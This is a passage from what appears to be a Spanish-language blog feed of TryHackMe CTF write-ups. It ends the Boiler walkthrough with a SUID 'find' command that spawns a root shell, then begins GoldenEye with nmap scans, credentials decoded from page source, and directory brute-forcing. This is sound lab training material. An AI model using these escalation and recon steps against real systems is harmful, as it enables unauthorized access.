	     scp  &lt;span class=&#34;nv&#34;&gt;$SOURCE&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$USER&lt;/span&gt;@&lt;span class=&#34;nv&#34;&gt;$REMOTE&lt;/span&gt;:&lt;span class=&#34;nv&#34;&gt;$TARGET&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$DATE&lt;/span&gt;
	     &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;completed&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$LOG&lt;/span&gt;
		
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; -n &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;ssh &lt;span class=&#34;nv&#34;&gt;$USER&lt;/span&gt;@&lt;span class=&#34;nv&#34;&gt;$REMOTE&lt;/span&gt; ls &lt;span class=&#34;nv&#34;&gt;$TARGET&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$DATE&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; 2&amp;gt;/dev/null&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
		    rm &lt;span class=&#34;nv&#34;&gt;$SOURCE&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;
		    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;removed&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$LOG&lt;/span&gt;
		    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;####################&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$LOG&lt;/span&gt;
				&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
					&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Copy not complete&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$LOG&lt;/span&gt;
					&lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt; 
    &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;    
&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Directory is not present&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$LOG&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos la &amp;ldquo;contraseña&amp;rdquo; y logramos obtener una shell con el usuario &lt;code&gt;stoner&lt;/code&gt; y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_214608.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;find&lt;/code&gt;  para encontrar archivos con permisos SUID y vemos el comando/archivo &lt;code&gt;find&lt;/code&gt;. Utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/find/&#34;&gt;&lt;strong&gt;find&lt;/strong&gt;&lt;/a&gt; para obtener una shell root.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/usr/bin/find . -exec /bin/sh -p &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt; -quit
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtenemos una shell con el usuario &lt;code&gt;root&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_220139.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_220219.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/boilerctf/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/boilerctf/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - GoldenEye</title>
        <link>https://sckull.github.io/posts/goldeneye/</link>
        <pubDate>Wed, 05 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 05 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/goldeneye/</guid>
        <description>GoldenEye es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;GoldenEye es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;GoldenEye&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Bond, James Bond. A guided CTF.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;420&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/ben&#34;&gt;ben&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;goldeneye-part-1&#34;&gt;GOLDENEYE PART 1&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80). ssl (55006), pop3 (55007) y el puerto smtp (25) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Aug  5 17:03:08 2020 as: nmap -sV -o mini_scan golden.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; golden.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.38.197&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
80/tcp open  http    Apache httpd 2.4.7 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Aug  5 17:03:58 2020 -- 1 IP address (1 host up) scanned in 50.07 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Aug  5 17:02:54 2020 as: nmap -sV -p- -T5 -o big_scan golden.thm&lt;/span&gt;
Warning: 10.10.38.197 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; golden.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.38.197&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65449&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;82&lt;/span&gt; filtered ports
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
80/tcp    open  http        Apache httpd 2.4.7 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
55006/tcp open  ssl/unknown
55007/tcp open  pop3        Dovecot pop3d

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Aug  5 17:16:03 2020 -- 1 IP address (1 host up) scanned in 789.07 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80, en donde mencionan un directorio &lt;code&gt;/sev-home/&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_160933.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el codigo del script que se ejecuta en la pagina encontramos un posible nombre de usuario y contraseña, en el comentario tambien indica que la contraseña esta codificada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_161137.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt; para obtener en texto plano la contraseña.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_161309.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el directorio &lt;code&gt;/sev-home/&lt;/code&gt; encontramos un panel simple de logeo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_161449.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al ingresar con las credenciales que encontramos nos muestra un video con contenido en la pagina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_161645.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En uno de los parrafos muestra el siguiente mensaje, en el que indican que devemos de enviar un correo a un supervisor calificado, y que el servicio de pop3 esta configurado en un puerto alto que seria el &lt;a href=&#34;#nmap&#34;&gt;&lt;strong&gt;55007&lt;/strong&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Please email a qualified GNO supervisor to receive the online 
GoldenEye Operators Training to become an Administrator of 
the GoldenEye system

Remember, since security by obscurity is very effective, 
we have configured our pop3 service to run on a very high 
non-default port
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Además en el codigo fuente de la pagina encontramos otro posible nombre de usuario junto a otro que ya encontramos y que son &amp;ldquo;supervisores&amp;rdquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_162408.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;rustbustergobuster&#34;&gt;RUSTBUSTER/GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos en el directorio principal (/).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~ rustbuster v3.0.3 ~ by phra &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; ps1dr3x ~

         _     _                 _         _           _        _                 _         _           _           _     
        /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;  
       /  &lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt; / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; 
      / /&lt;span class=&#34;se&#34;&gt;\ \ \ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;
     / / /&lt;span class=&#34;se&#34;&gt;\ \_\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    / / /_/ / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; /_/_ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / / /_/ / /
   / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / / / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / /&lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;/ / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ /____/&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / 
  / / /_____/ / / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / / /  &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_// / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;___&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  / / /_____/  
 / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /____&lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;/ / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /______ / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   
/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /__________/ / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /_______/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;  
&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_____________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;__________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;   


&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started at	: 2020-08-05 17:13:55

GET	&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK				http://golden.thm/
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.php
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.html
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.hta
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.hta.php
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.hta.html
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.hta.txt
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htaccess
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htaccess.php
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htaccess.html
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htaccess.txt
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htpasswd
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htpasswd.php
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htpasswd.html
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htpasswd.txt
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://golden.thm/index.html
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://golden.thm/index.html
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/server-status
